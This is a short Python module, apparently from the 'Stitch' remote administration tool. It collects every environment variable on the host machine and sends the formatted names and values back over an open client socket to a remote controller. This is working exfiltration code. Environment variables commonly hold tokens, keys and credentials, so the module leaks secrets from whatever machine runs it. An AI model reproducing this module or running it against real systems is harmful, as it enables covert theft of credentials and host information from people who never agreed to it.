# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

resp = ''
for n in os.environ:
    resp += "    {0:35}: {1}\n\n".format(n,os.environ.get(n))
resp = resp.replace(';','\n{0:39}: '.format(""))
send(client_socket,resp)
